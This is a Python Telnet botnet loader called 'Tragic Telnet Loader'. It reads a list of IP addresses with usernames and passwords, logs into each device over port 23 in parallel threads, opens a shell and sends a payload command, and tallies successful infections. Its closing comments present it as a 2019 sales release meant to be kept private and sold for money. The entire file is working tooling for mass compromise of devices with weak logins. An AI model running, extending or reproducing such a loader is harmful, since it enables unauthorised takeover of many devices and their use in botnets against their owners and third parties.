#!/usr/bin/python
# Tragic Telnet Loader

import sys
import re
import os
import time
import socket
from threading import Thread

cmd=""
info = open(str(sys.argv[1]),'a+')
RAN = 0
CONNF = 0
USERF = 0
PASSF = 0
CMDS = 0

def tragedy(ip,username,password):
	ip = str(ip).rstrip("\n")
	username = username.rstrip("\n")
	password = password.rstrip("\n")
	try:
		tn = socket.socket()
		tn.settimeout(5)
		tn.connect((ip,23))
	except Exception:
		tn.close()
		global CONNF
		CONNF += 1
		global RAN
		RAN += 1
		print("\x1b[37m|| \x1b[1;36mRan\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPayloads Sent\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mConnFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mUserFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPassFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m||\x1b[0m"% (RAN, CMDS, CONNF, USERF, PASSF))
		return
	try:
		tragic = ''
		tragic += readUntil(tn, "ogin")
		if "ogin" in tragic:
			tn.send(username + "\n")
			time.sleep(0.09)
		else:
			global RAN
			RAN += 1
			return
	except Exception:
		tn.close()
		global RAN
		RAN += 1
		global USERF
		USERF += 1
		print("\x1b[37m|| \x1b[1;36mRan\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPayloads Sent\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mConnFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mUserFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPassFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m||\x1b[0m"% (RAN, CMDS, CONNF, USERF, PASSF))
		return
	try:
		tragic = ''
		tragic += readUntil(tn, "assword:")
		if "assword" in tragic:
			tn.send(password + "\n")
			time.sleep(2)
		else:
			global RAN
			RAN += 1
			return
	except Exception:
		tn.close()
		global PASSF
		PASSF += 1
		global RAN
		RAN += 1
		print("\x1b[37m|| \x1b[1;36mRan\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPayloads Sent\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mConnFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mUserFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPassFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m||\x1b[0m"% (RAN, CMDS, CONNF, USERF, PASSF))
		return
	try:
		tn.send("sh" + "\n")
		time.sleep(0.05)
		tn.send(cmd + "\n")
		time.sleep(15)
		global CMDS
		CMDS += 1
		global RAN
		RAN += 1
		tn.close()
	except Exception:
		tn.close()
	print("\x1b[37m|| \x1b[1;36mRan\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPayloads Sent\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mConnFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mUserFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPassFails\x1b[1;31m: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m||\x1b[0m"% (RAN, CMDS, CONNF, USERF, PASSF))


def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

for x in info:
	try:
		if ":23 " in x:
			x = x.replace(":23 ", ":")
		xinfo = x.split(":")
		session = Thread(target=tragedy, args=(xinfo[0].rstrip("\n"),xinfo[1].rstrip("\n"),xinfo[2].rstrip("\n"),))
		session.start()
		ip=xinfo[0]
		username=xinfo[1]
		password=xinfo[2]
		time.sleep(0.01)
	except:
		pass

#    Modifying This Code Is Permitted, However, Ripping Code From This/Removing Credits Is The Lowest Of The Low.
#    Sales Release 10/5/2019
#    KEEP IT PRIVATE; I'd Rather You Sell It Than Give It Away Or Post Somewhere. We're All Here To Make Money!
#    Much Love 
#        - Tragedy